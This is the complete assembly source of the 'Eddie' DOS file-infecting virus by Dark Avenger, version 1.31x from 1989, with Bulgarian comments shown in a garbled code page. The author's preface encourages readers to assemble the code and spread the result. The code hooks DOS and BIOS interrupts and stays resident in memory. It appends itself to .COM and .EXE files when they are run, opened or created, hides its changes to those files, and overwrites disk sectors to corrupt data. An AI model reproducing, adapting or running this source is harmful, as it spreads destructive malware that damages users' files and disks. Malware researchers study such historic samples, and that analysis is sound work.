;************************
;*			*
;*	E D D I E	*
;*			*
;*   by  Dark Avenger	*
;*			*
;*	3-JAN-1989	*
;*			*
;*     version 1.31x	*
;*			*
;************************


; "Blessed is he who expects nothing, for he shall not be disappointed."

;   П░ед ва▒ ▒▓ои о░игинални┐▓ ▓ек▒▓ на един о▓ п║░ви▓е б║лга░▒ки ви░│▒и.  Как▓о
; може би ╣е забележи▓е, ▓ой е п║лен ▒ гл│по▒▓и и г░е╕ки, но в║п░еки ▓ова не
; ▒амо ╖е ▒е ░азп░о▒▓░ани │╖│два╣о б║░зо из ▒▓░ана▓а, но и │▒п┐ за к░а▓ко в░еме
; да обиколи ▒ве▓а (Той е ░азп░о▒▓░анен как▓о в Из▓о╖на и Западна Ев░опа, ▓ака и
; в Аме░ика).  Тек▒▓║▓ ▒е ░азп░о▒▓░ан┐ва нап║лно ▒вободно по ▒л│╖ай 1 година о▓
; зав║░╕ване▓о на базова▓а м│ ве░▒и┐.  Вие има▓е п░аво да ░азп░о▒▓░ан┐ва▓е
; ▓ек▒▓а как▓о безпла▓но, ▓ака и ▒░е╣│ запла╣ане ▒ един▒▓вено▓о │▒ловие ▓ой
; изоб╣о да не е п░омен┐н.  Кой▓о │ми╕лено ░азп░о▒▓░ан┐ва п░оменен по н┐как║в
; на╖ин ▓ек▒▓, в║░╕и ▓ова п░о▓ив желание▓о на ав▓о░а и ╣е б║де наказан!  В║п░еки
; ▓ова, ав▓о░║▓ ╣е ▒е ░адва ако н┐кой о▓ ва▒ изв║░╕и подоб░ени┐ в ▓ек▒▓а и
; ░азп░о▒▓░ан┐ва пол│╖ени┐ изп║лним ┤айл (▓.е.	▒ами┐▓ ви░│▒).	Об║░не▓е
; внимание, ╖е ▒лед а▒ембли░ане▓о пол│╖ени┐▓ .COM ┤айл не може да б║де
; ▒▓а░▓и░ан.  За ╢ел▓а ▓░┐бва да ▒║здаде▓е ┤айл ▒ д║лжина 3 бай▓а, ▒║д║░жа╣
; ╕е▒▓най▒е▓и╖ни▓е ╖и▒ла 0e9h, 68h, 0 и ▒лед ▓ова да обедини▓е два▓а ┤айла.  Не
; ▒е опи▓вай▓е да по▒▓ави▓е ин▒▓░│к╢и┐ JMP в на╖ало▓о на ▓ек▒▓а.


;   ПРЕДУПРЕЖДЕНИЕ:  Ав▓о░║▓ не поема никаква о▓гово░но▒▓ за ди░ек▓но или
; инди░ек▓но нане▒ени ╣е▓и, п░едизвикани о▓ използване▓о или неизполз│ване▓о на
; ▓ози ▓ек▒▓ или на пол│╖ени┐ п░и а▒ембли░ане код.  Никаква га░ан╢и┐ не ▒е дава
; за ┤│нк╢иони░ане▓о или ка╖е▒▓во▓о на п░од│к▓а.

;   Не мога да не ▒е в║зд║░жа да изкажа ▒пе╢иална▓а ▒и благода░но▒▓ на мо┐
; поп│л┐░иза▓о░ инж.  Ве▒елин Бон╖ев, кой▓о ми п░ави гол┐ма ░еклама и о▒вен
; ▓ова, и▒кайки или не, ▓ой ▒║дей▒▓в│ва много за ░азп░о▒▓░ан┐ване▓о на мои▓е
; ви░│▒и в║п░еки, ╖е ▒е опи▓ва да п░ави ▓о╖но об░а▓но▓о (пи▒ане▓о на п░ог░ами на
; C никого не е довело до доб░о).
;   Позд░ави на в▒и╖ки ви░│▒опи▒а╖и!

code	segment
	assume	cs:code,ds:code
copyright:
	db	'Eddie lives...somewhere in time!',0
date_stamp:
	dd	12239000h
checksum:
	db	30

; В░║╣ане на │п░авление▓о на .EXE ┤айл:
; В║з▒▓анов┐ва DS=ES=PSP, за░ежда SS:SP и CS:IP.

exit_exe:
	mov	bx,es
	add	bx,10h
	add	bx,word ptr cs:[si+call_adr+2]
	mov	word ptr cs:[si+patch+2],bx
	mov	bx,word ptr cs:[si+call_adr]
	mov	word ptr cs:[si+patch],bx
	mov	bx,es
	add	bx,10h
	add	bx,word ptr cs:[si+stack_pointer+2]
	mov	ss,bx
	mov	sp,word ptr cs:[si+stack_pointer]
	db	0eah			;JMP XXXX:YYYY
patch:
	dd	0

; В░║╣ане на │п░авление▓о на .COM ┤айл:
; В║з▒▓анов┐ва 3-▓е бай▓а в на╖ало▓о на ┤айла, за░ежда SP и IP.

exit_com:
	mov	di,100h
	add	si,offset my_save
	movsb
	movsw
	mov	sp,ds:[6]		;Това е неп░авилно
	xor	bx,bx
	push	bx
	jmp	[si-11] 		;si+call_adr-top_file

; В╡одна ▓о╖ка на п░ог░ама▓а.

startup:
	call	relative
relative:
	pop	si			;SI = $
	sub	si,offset relative
	cld
	cmp	word ptr cs:[si+my_save],5a4dh
	je	exe_ok
	cli
	mov	sp,si			;За .COM ┤айлове▓е ▒е подд║░жа о▓делен
	add	sp,offset top_file+100h ;▒▓ек, за да не ▒е п░еме▒▓и п░ог░ама▓а
	sti				;в║░╡│ ▒▓ека
	cmp	sp,ds:[6]
	jnc	exit_com
exe_ok:
	push	ax
	push	es
	push	si
	push	ds
	mov	di,si

; Нами░ане на ад░е▒а на INT 13h в ROM-BIOS

	xor	ax,ax
	push	ax
	mov	ds,ax
	les	ax,ds:[13h*4]
	mov	word ptr cs:[si+fdisk],ax
	mov	word ptr cs:[si+fdisk+2],es
	mov	word ptr cs:[si+disk],ax
	mov	word ptr cs:[si+disk+2],es
	mov	ax,ds:[40h*4+2] 	;В INT 40h ▒е запазва ад░е▒а на INT 13h
	cmp	ax,0f000h		;за ди▒ке▓и п░и нали╖ие на ▓в║░д ди▒к
	jne	nofdisk
	mov	word ptr cs:[si+disk+2],ax
	mov	ax,ds:[40h*4]
	mov	word ptr cs:[si+disk],ax
	mov	dl,80h
	mov	ax,ds:[41h*4+2] 	;INT 41h обикновено ▒о╖и в ▒егмен▓а,
	cmp	ax,0f000h		;к║де▓о е о░игинални┐ INT 13h век▓о░
	je	isfdisk
	cmp	ah,0c8h
	jc	nofdisk
	cmp	ah,0f4h
	jnc	nofdisk
	test	al,7fh
	jnz	nofdisk
	mov	ds,ax
	cmp	ds:[0],0aa55h
	jne	nofdisk
	mov	dl,ds:[2]
isfdisk:
	mov	ds,ax
	xor	dh,dh
	mov	cl,9
	shl	dx,cl
	mov	cx,dx
	xor	si,si
findvect:
	lodsw				;Обикновено запо╖ва ▒:
	cmp	ax,0fa80h		;	CMP	DL,80h
	jne	altchk			;	JNC	н┐к║де
	lodsw
	cmp	ax,7380h
	je	intchk
	jne	nxt0
altchk:
	cmp	ax,0c2f6h		;или ▒:
	jne	nxt			;	TEST	DL,80h
	lodsw				;	JNZ	н┐к║де
	cmp	ax,7580h
	jne	nxt0
intchk:
	inc	si			;▒лед кое▓о има:
	lodsw				;	INT	40h
	cmp	ax,40cdh
	je	found
	sub	si,3
nxt0:
	dec	si
	dec	si
nxt:
	dec	si
	loop	findvect
	jmp	short nofdisk
found:
	sub	si,7
	mov	word ptr cs:[di+fdisk],si
	mov	word ptr cs:[di+fdisk+2],ds
nofdisk:
	mov	si,di
	pop	ds

; П░ове░ка дали п░ог░ама▓а е ░езиден▓на

	les	ax,ds:[21h*4]
	mov	word ptr cs:[si+save_int_21],ax
	mov	word ptr cs:[si+save_int_21+2],es
	push	cs
	pop	ds
	cmp	ax,offset int_21
	jne	bad_func
	xor	di,di
	mov	cx,offset my_size
scan_func:
	lodsb
	scasb
	jne	bad_func
	loop	scan_func
	pop	es
	jmp	go_program

; П░еме▒▓ване на п░ог░ама▓а в го░ни┐ к░ай на паме▓▓а
; (▓│к е п║лно ▒ гл│по▒▓и и г░е╕ки)

bad_func:
	pop	es
	mov	ah,49h
	int	21h
	mov	bx,0ffffh
	mov	ah,48h
	int	21h
	sub	bx,(top_bz+my_bz+1ch-1)/16+2
	jc	go_program
	mov	cx,es
	stc
	adc	cx,bx
	mov	ah,4ah
	int	21h
	mov	bx,(offset top_bz+offset my_bz+1ch-1)/16+1
	stc
	sbb	es:[2],bx
	push	es
	mov	es,cx
	mov	ah,4ah
	int	21h
	mov	ax,es
	dec	ax
	mov	ds,ax
	mov	word ptr ds:[1],8
	call	mul_16
	mov	bx,ax
	mov	cx,dx
	pop	ds
	mov	ax,ds
	call	mul_16
	add	ax,ds:[6]
	adc	dx,0
	sub	ax,bx
	sbb	dx,cx
	jc	mem_ok
	sub	ds:[6],ax		;Намал┐ване на големина▓а на ▒егмен▓а
mem_ok:
	pop	si
	push	si
	push	ds
	push	cs
	xor	di,di
	mov	ds,di
	lds	ax,ds:[27h*4]
	mov	word ptr cs:[si+save_int_27],ax
	mov	word ptr cs:[si+save_int_27+2],ds
	pop	ds
	mov	cx,offset aux_size
	rep	movsb
	xor	ax,ax
	mov	ds,ax
	mov	ds:[21h*4],offset int_21;П░е╡ва╣ане на INT 21h и INT 27h
	mov	ds:[21h*4+2],es
	mov	ds:[27h*4],offset int_27
	mov	ds:[27h*4+2],es
	mov	word ptr es:[filehndl],ax
	pop	es
go_program:
	pop	si

; Замазване на ▒ледва╣и┐ ▒ек▓о░ о▓ ди▒ка

	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:[13h*4]
	mov	word ptr cs:[si+save_int_13],ax
	mov	ax,ds:[13h*4+2]
	mov	word ptr cs:[si+save_int_13+2],ax
	mov	ds:[13h*4],offset int_13
	add	ds:[13h*4],si
	mov	ds:[13h*4+2],cs
	pop	ds
	push	ds
	push	si
	mov	bx,si
	lds	ax,ds:[2ah]
	xor	si,si
	mov	dx,si
scan_envir:				;Нами░а име▓о на п░ог░ама▓а
	lodsw				;(▒║▒ DOS 2.x и без д░│го не ░або▓и)
	dec	si
	test	ax,ax
	jnz	scan_envir
	add	si,3
	lodsb

; Следва╣а▓а ин▒▓░│к╢и┐ е п║лна гл│по▒▓.  Опи▓ай▓е да ▒и напи╕е▓е path-а ▒
; малки б│кви, ▒лед ▓ова п│▒не▓е за░азена п░ог░ама о▓ ▓ам.  В ░ез│л▓а▓
; на г░е╕ка▓а ▓│к + г░е╕ка в DOS ▒ледва╣и┐▓ ▒ек▓о░ не ▒е замазва, но ▒е
; замазва▓ два бай▓а в паме▓▓а, най-ве░о┐▓но в║░╡│ за░азена▓а п░ог░ама.

	sub	al,'A'
	mov	cx,1
	push	cs
	pop	ds
	add	bx,offset int_27
	push	ax
	push	bx
	push	cx
	int	25h
	pop	ax
	pop	cx
	pop	bx
	inc	byte ptr [bx+0ah]
	and	byte ptr [bx+0ah],0fh	;Изглежда 15 п║▓и неп░авене ни╣о е много
	jnz	store_sec		;малко за н┐кои ╡о░а
	mov	al,[bx+10h]
	xor	ah,ah
	mul	word ptr [bx+16h]
	add	ax,[bx+0eh]
	push	ax
	mov	ax,[bx+11h]
	mov	dx,32
	mul	dx
	div	word ptr [bx+0bh]
	pop	dx
	add	dx,ax
	mov	ax,[bx+8]
	add	ax,40h
	cmp	ax,[bx+13h]
	jc	store_new
	inc	ax
	and	ax,3fh
	add	ax,dx
	cmp	ax,[bx+13h]
	jnc	small_disk
store_new:
	mov	[bx+8],ax
store_sec:
	pop	ax
	xor	dx,dx
	push	ax
	push	bx
	push	cx
	int	26h

; Запи▒║▓ п░ез ▓ова п░ек║▒ване не е най-│мно▓о не╣о, за╣о▓о ▓о може да б║де
; п░е╡вана▓о (как▓о е │▒п┐л да забележи Ве▒елин Бон╖ев)

	pop	ax
	pop	cx
	pop	bx
	pop	ax
	cmp	byte ptr [bx+0ah],0
	jne	not_now
	mov	dx,[bx+8]
	pop	bx
	push	bx
	int	26h
small_disk:
	pop	ax
not_now:
	pop	si
	xor	ax,ax
	mov	ds,ax
	mov	ax,word ptr cs:[si+save_int_13]
	mov	ds:[13h*4],ax
	mov	ax,word ptr cs:[si+save_int_13+2]
	mov	ds:[13h*4+2],ax
	pop	ds
	pop	ax
	cmp	word ptr cs:[si+my_save],5a4dh
	jne	go_exit_com
	jmp	exit_exe
go_exit_com:
	jmp	exit_com
int_24:
	mov	al,3			;Тази ин▒▓░│к╢и┐ изглежда изли╕на
	iret

; Об░або▓ка на INT 27h (▓ова е необ╡одимо)

int_27:
	pushf
	call	alloc
	popf
	jmp	dword ptr cs:[save_int_27]

; П░и DOS-┤│нк╢ии▓е Set & Get Vector ▒е ░або▓и ка▓о ╖е ли п░ог░ама▓а не ги е
; п░е╡ванала (▓ова е ▒║мни▓елно п░едим▒▓во и е един в║зможен из▓о╖ник на
; недо░аз│мени┐ ▒ н┐кои "ин▓елиген▓ни" п░ог░ами)

set_int_27:
	mov	word ptr cs:[save_int_27],dx
	mov	word ptr cs:[save_int_27+2],ds
	popf
	iret
set_int_21:
	mov	word ptr cs:[save_int_21],dx
	mov	word ptr cs:[save_int_21+2],ds
	popf
	iret
get_int_27:
	les	bx,dword ptr cs:[save_int_27]
	popf
	iret
get_int_21:
	les	bx,dword ptr cs:[save_int_21]
	popf
	iret

exec:
	call	do_file
	call	alloc
	popf
	jmp	dword ptr cs:[save_int_21]

	db	'Diana P.',0

; Об░або▓ка на INT 21h.  О▒║╣е▒▓в┐ва за░аз┐ване▓о на ┤айлове▓е
; п░и изп║лнение, копи░ане, ░азглеждане или ▒║здаване и н┐кои д░│ги опе░а╢ии.
; Изп║лнение▓о на ┤│нк╢ии 0 и 26h п░едизвиква ло╕и по▒леди╢и.

int_21:
	push	bp
	mov	bp,sp
	push	[bp+6]
	popf
	pop	bp
	pushf
	call	ontop
	cmp	ax,2521h
	je	set_int_21
	cmp	ax,2527h
	je	set_int_27
	cmp	ax,3521h
	je	get_int_21
	cmp	ax,3527h
	je	get_int_27
	cld
	cmp	ax,4b00h
	je	exec
	cmp	ah,3ch
	je	create
	cmp	ah,3eh
	je	close
	cmp	ah,5bh
	jne	not_create
create:
	cmp	word ptr cs:[filehndl],0;Може и да е 0 п░и о▓во░ен ┤айл
	jne	dont_touch
	call	see_name
	jnz	dont_touch
	call	alloc
	popf
	call	function
	jc	int_exit
	pushf
	push	es
	push	cs
	pop	es
	push	si
	push	di
	push	cx
	push	ax
	mov	di,offset filehndl
	stosw
	mov	si,dx
	mov	cx,65
move_name:
	lodsb
	stosb
	test	al,al
	jz	all_ok
	loop	move_name
	mov	word ptr es:[filehndl],cx
all_ok:
	pop	ax
	pop	cx
	pop	di
	pop	si
	pop	es
go_exit:
	popf
	jnc	int_exit		;JMP
close:
	cmp	bx,word ptr cs:[filehndl]
	jne	dont_touch
	test	bx,bx
	jz	dont_touch
	call	alloc
	popf
	call	function
	jc	int_exit
	pushf
	push	ds
	push	cs
	pop	ds
	push	dx
	mov	dx,offset filehndl+2
	call	do_file
	mov	word ptr cs:[filehndl],0
	pop	dx
	pop	ds
	jmp	go_exit
not_create:
	cmp	ah,3dh
	je	touch
	cmp	ah,43h
	je	touch
	cmp	ah,56h			;За ▒║жаление командни┐ ин▓е░п░е▓а▓о░
	jne	dont_touch		;не използ│ва ▓ази ┤│нк╢и┐
touch:
	call	see_name
	jnz	dont_touch
	call	do_file
dont_touch:
	call	alloc
	popf
	call	function
int_exit:
	pushf
	push	ds
	call	get_chain
	mov	byte ptr ds:[0],'Z'
	pop	ds
	popf
dummy	proc	far			;???
	ret	2
dummy	endp

; П░ове░┐ва дали ┤айл║▓ е .COM или .EXE.  Не ▒е извиква п░и изп║лнение на ┤айл.

see_name:
	push	ax
	push	si
	mov	si,dx
scan_name:
	lodsb
	test	al,al
	jz	bad_name
	cmp	al,'.'
	jnz	scan_name
	call	get_byte
	mov	ah,al
	call	get_byte
	cmp	ax,'co'
	jz	pos_com
	cmp	ax,'ex'
	jnz	good_name
	call	get_byte
	cmp	al,'e'
	jmp	short good_name
pos_com:
	call	get_byte
	cmp	al,'m'
	jmp	short good_name
bad_name:
	inc	al
good_name:
	pop	si
	pop	ax
	ret

; П░еоб░аз│ва в lowercase (подп░ог░ами▓е ▒а велико не╣о).

get_byte:
	lodsb
	cmp	al,'C'
	jc	byte_got
	cmp	al,'Y'
	jnc	byte_got
	add	al,20h
byte_got:
	ret

; Извиква о░игинални┐ INT 21h (за да не ▒е за╢икли).

function:
	pushf
	call	dword ptr cs:[save_int_21]
	ret

; У░ежда в║п░о▒а на изп║лним ┤айл.

do_file:
	push	ds			;Запазва ░еги▒▓░и▓е в ▒▓ека
	push	es
	push	si
	push	di
	push	ax
	push	bx
	push	cx
	push	dx
	mov	si,ds
	xor	ax,ax
	mov	ds,ax
	les	ax,ds:[24h*4]		;Запазва INT 13h и INT 24h в ▒▓ека
	push	es			;и ги подмен┐ ▒ кои▓о ▓░┐бва
	push	ax
	mov	ds:[24h*4],offset int_24
	mov	ds:[24h*4+2],cs
	les	ax,ds:[13h*4]
	mov	word ptr cs:[save_int_13],ax
	mov	word ptr cs:[save_int_13+2],es
	mov	ds:[13h*4],offset int_13
	mov	ds:[13h*4+2],cs
	push	es
	push	ax
	mov	ds,si
	xor	cx,cx			;У░ежда в║п░о▒а на Read-only ┤айлове▓е
	mov	ax,4300h
	call	function
	mov	bx,cx
	and	cl,0feh
	cmp	cl,bl
	je	dont_change
	mov	ax,4301h
	call	function
	stc
dont_change:
	pushf
	push	ds
	push	dx
	push	bx
	mov	ax,3d02h		;Сега ве╖е можем на ▒покой▒▓вие да
	call	function		;о▓во░им ┤айла
	jc	cant_open
	mov	bx,ax
	call	disease
	mov	ah,3eh			;За▓ва░┐не
	call	function
cant_open:
	pop	cx
	pop	dx
	pop	ds
	popf
	jnc	no_update
	mov	ax,4301h		;В║з▒▓анов┐ване на а▓░иб│▓и▓е на ┤айла,
	call	function		;ако ▒а били п░оменени (за в▒еки ▒л│╖ай)
no_update:
	xor	ax,ax			;В║з▒▓анов┐ване на INT 13h и INT 24h
	mov	ds,ax
	pop	ds:[13h*4]
	pop	ds:[13h*4+2]
	pop	ds:[24h*4]
	pop	ds:[24h*4+2]
	pop	dx			;В║з▒▓анов┐ване на ░еги▒▓░и▓е
	pop	cx
	pop	bx
	pop	ax
	pop	di
	pop	si
	pop	es
	pop	ds
	ret

; Тази подп░ог░ама в║░╕и ╖е░на▓а ░або▓а.

disease:
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	dx,offset top_save	;П░о╖и▓ане на на╖ало▓о на ┤айла
	mov	cx,18h
	mov	ah,3fh
	int	21h
	xor	cx,cx
	xor	dx,dx
	mov	ax,4202h		;Запазване на д║лжина▓а на ┤айла
	int	21h
	mov	word ptr [top_save+1ah],dx
	cmp	ax,offset my_size	;Би ▓░┐бвало да б║де top_file
	sbb	dx,0
	jc	stop_fuck_2		;Малки ┤айлове не ▒е за░аз┐ва▓
	mov	word ptr [top_save+18h],ax
	cmp	word ptr [top_save],5a4dh
	jne	com_file
	mov	ax,word ptr [top_save+8]
	add	ax,word ptr [top_save+16h]
	call	mul_16
	add	ax,word ptr [top_save+14h]
	adc	dx,0
	mov	cx,dx
	mov	dx,ax
	jmp	short see_sick
com_file:
	cmp	byte ptr [top_save],0e9h
	jne	see_fuck
	mov	dx,word ptr [top_save+1]
	add	dx,103h
	jc	see_fuck
	dec	dh
	xor	cx,cx

; П║лна п░ове░ка дали за ┤айла е залепен кой▓о ▓░┐бва

see_sick:
	sub	dx,startup-copyright
	sbb	cx,0
	mov	ax,4200h
	int	21h
	add	ax,offset top_file
	adc	dx,0
	cmp	ax,word ptr [top_save+18h]
	jne	see_fuck
	cmp	dx,word ptr [top_save+1ah]
	jne	see_fuck
	mov	dx,offset top_save+1ch
	mov	si,dx
	mov	cx,offset my_size
	mov	ah,3fh
	int	21h
	jc	see_fuck
	cmp	cx,ax
	jne	see_fuck
	xor	di,di
next_byte:
	lodsb
	scasb
	jne	see_fuck
	loop	next_byte
stop_fuck_2:
	ret
see_fuck:
	xor	cx,cx			;Пози╢иони░ане в к░а┐ на ┤айла
	xor	dx,dx
	mov	ax,4202h
	int	21h
	cmp	word ptr [top_save],5a4dh
	je	fuck_exe
	add	ax,offset aux_size+200h ;Да не ▒▓ане .COM ┤айла много гол┐м
	adc	dx,0
	je	fuck_it
	ret

; Из░авн┐ва на г░ани╢а на па░аг░а┤ за .EXE ┤айлове▓е.  Това е аб▒ол╛▓но нен│жно.

fuck_exe:
	mov	dx,word ptr [top_save+18h]
	neg	dl
	and	dx,0fh
	xor	cx,cx
	mov	ax,4201h
	int	21h
	mov	word ptr [top_save+18h],ax
	mov	word ptr [top_save+1ah],dx
fuck_it:
	mov	ax,5700h		;Запазване на да▓а▓а на ┤айла
	int	21h
	pushf
	push	cx
	push	dx
	cmp	word ptr [top_save],5a4dh
	je	exe_file		;Много │мно, н┐ма ╣о
	mov	ax,100h
	jmp	short set_adr
exe_file:
	mov	ax,word ptr [top_save+14h]
	mov	dx,word ptr [top_save+16h]
set_adr:
	mov	di,offset call_adr
	stosw
	mov	ax,dx
	stosw
	mov	ax,word ptr [top_save+10h]
	stosw
	mov	ax,word ptr [top_save+0eh]
	stosw
	mov	si,offset top_save	;Това дава в║зможно▒▓ на ░азни в░едни
	movsb				;п░ог░ами да в║з▒▓анов┐▓ ▓о╖но
	movsw				;о░игинална▓а д║лжина на .EXE ┤айла
	xor	dx,dx
	mov	cx,offset top_file
	mov	ah,40h
	int	21h			;Запи▒ване на п░ог░ама▓а
	jc	go_no_fuck		;(не ▓░а▒и░ай▓е ▓│к)
	xor	cx,ax
	jnz	go_no_fuck
	mov	dx,cx
	mov	ax,4200h
	int	21h
	cmp	word ptr [top_save],5a4dh
	je	do_exe
	mov	byte ptr [top_save],0e9h
	mov	ax,word ptr [top_save+18h]
	add	ax,startup-copyright-3
	mov	word ptr [top_save+1],ax
	mov	cx,3
	jmp	short write_header
go_no_fuck:
	jmp	short no_fuck

; Кон▒▓░│и░ане на header-а на .EXE ┤айла

do_exe:
	call	mul_hdr
	not	ax
	not	dx
	inc	ax
	jne	calc_offs
	inc	dx
calc_offs:
	add	ax,word ptr [top_save+18h]
	adc	dx,word ptr [top_save+1ah]
	mov	cx,10h
	div	cx
	mov	word ptr [top_save+14h],startup-copyright
	mov	word ptr [top_save+16h],ax
	add	ax,(offset top_file-offset copyright-1)/16+1
	mov	word ptr [top_save+0eh],ax
	mov	word ptr [top_save+10h],100h
	add	word ptr [top_save+18h],offset top_file
	adc	word ptr [top_save+1ah],0
	mov	ax,word ptr [top_save+18h]
	and	ax,1ffh
	mov	word ptr [top_save+2],ax
	pushf
	mov	ax,word ptr [top_save+19h]
	shr	byte ptr [top_save+1bh],1
	rcr	ax,1
	popf
	jz	update_len
	inc	ax
update_len:
	mov	word ptr [top_save+4],ax
	mov	cx,18h
write_header:
	mov	dx,offset top_save
	mov	ah,40h
	int	21h			;Запи▒ване на на╖ало▓о на ┤айла
no_fuck:
	pop	dx
	pop	cx
	popf
	jc	stop_fuck
	mov	ax,5701h		;В║з▒▓анов┐ване на о░игинална▓а да▓а
	int	21h
stop_fuck:
	ret

; Използ│ва ▒е о▓ подп░ог░ами▓е за об░або▓ка на INT 21h и INT 27h в║в в░║зка
; ▒║▒ ▒к░иване▓о на п░ог░ама▓а в паме▓▓а о▓ ╡о░а, кои▓о н┐ма н│жда да ┐
; вижда▓.  Ц┐ла▓а ▓ази ▒и▒▓ема е аб▒│░дна и гл│пава и е о╣е един из▓о╖ник
; на кон┤лик▓ни ▒и▓│а╢ии.

alloc:
	push	ds
	call	get_chain
	mov	byte ptr ds:[0],'M'
	pop	ds

; О▒иг│░┐ва о▒▓аване▓о на п░ог░ама▓а на в║░╡а на ве░ига▓а п░о╢е▒и,
; п░е╡ванали INT 21h (е▓о о╣е един из▓о╖ник на кон┤лик▓и).

ontop:
	push	ds
	push	ax
	push	bx
	push	dx
	xor	bx,bx
	mov	ds,bx
	lds	dx,ds:[21h*4]
	cmp	dx,offset int_21
	jne	search_segment
	mov	ax,ds
	mov	bx,cs
	cmp	ax,bx
	je	test_complete

; П░е▓║░▒ва ▒егмен▓а на на▓░апника п░е╡ванал INT 21h, за да наме░и к║де ▓ой
; е запазил ▒▓а░а▓а ▒▓ойно▒▓ и да ┐ подмени.  За INT 27h не ▒е п░ави ни╣о.

	xor	bx,bx
search_segment:
	mov	ax,[bx]
	cmp	ax,offset int_21
	jne	search_next
	mov	ax,cs
	cmp	ax,[bx+2]
	je	got_him
search_next:
	inc	bx
	jne	search_segment
	je	return_control
got_him:
	mov	ax,word ptr cs:[save_int_21]
	mov	[bx],ax
	mov	ax,word ptr cs:[save_int_21+2]
	mov	[bx+2],ax
	mov	word ptr cs:[save_int_21],dx
	mov	word ptr cs:[save_int_21+2],ds
	xor	bx,bx

; И да не го пази в ▒║╣и┐ ▒егмен▓, ▓ова в▒е едно н┐ма да м│ помогне

return_control:
	mov	ds,bx
	mov	ds:[21h*4],offset int_21
	mov	ds:[21h*4+2],cs
test_complete:
	pop	dx
	pop	bx
	pop	ax
	pop	ds
	ret

; Нами░ане на ▒егмен▓а на по▒ледни┐ MCB

get_chain:
	push	ax
	push	bx
	mov	ah,62h
	call	function
	mov	ax,cs
	dec	ax
	dec	bx
next_blk:
	mov	ds,bx
	stc
	adc	bx,ds:[3]
	cmp	bx,ax
	jc	next_blk
	pop	bx
	pop	ax
	ret

; Умножение по 16

mul_hdr:
	mov	ax,word ptr [top_save+8]
mul_16:
	mov	dx,10h
	mul	dx
	ret

	db	'This program was written in the city of Sofia '
	db	'(C) 1988-89 Dark Avenger',0

; Об░або▓ка на INT 13h.
; Извиква о░игинални▓е век▓о░и в BIOS, ако ▒▓ава д│ма за запи▒.

int_13:
	cmp	ah,3
	jnz	subfn_ok
	cmp	dl,80h
	jnc	hdisk
	db	0eah			;JMP XXXX:YYYY
my_size:				;--- До▓│к ▒е ▒░авн┐ва ▒ о░игинала
disk:
	dd	0
hdisk:
	db	0eah			;JMP XXXX:YYYY
fdisk:
	dd	0
subfn_ok:
	db	0eah			;JMP XXXX:YYYY
save_int_13:
	dd	0
call_adr:
	dd	100h

stack_pointer:
	dd	0			;О░игинална ▒▓ойно▒▓ на SS:SP
my_save:
	int	20h			;О░игинално ▒║д║░жание на п║░ви▓е
	nop				;3 бай▓а о▓ ┤айла
top_file:				;--- До▓│к ▒е запи▒ва в║в ┤айлове▓е
filehndl    equ $
filename    equ filehndl+2		;Б│┤е░ за име на ▓ек│╣о о▓во░ени┐ ┤айл
save_int_27 equ filename+65		;О░игинална ▒▓ойно▒▓ на INT 27h
save_int_21 equ save_int_27+4		;О░игинална ▒▓ойно▒▓ на INT 21h
aux_size    equ save_int_21+4		;--- До▓│к ▒е п░еме▒▓ва в паме▓▓а
top_save    equ save_int_21+4		;На╖ало на б│┤е░а, ▒║д║░жа╣:
					; - П║░ви▓е 24 бай▓а п░о╖е▓ени о▓ ┤айла
					; - Д║лжина▓а на ┤айла (4 бай▓а)
					; - По▒ледни▓е бай▓ове о▓ ┤айла
					;   (▒ д║лжина my_size)
top_bz	    equ top_save-copyright
my_bz	    equ my_size-copyright
code	ends
	end
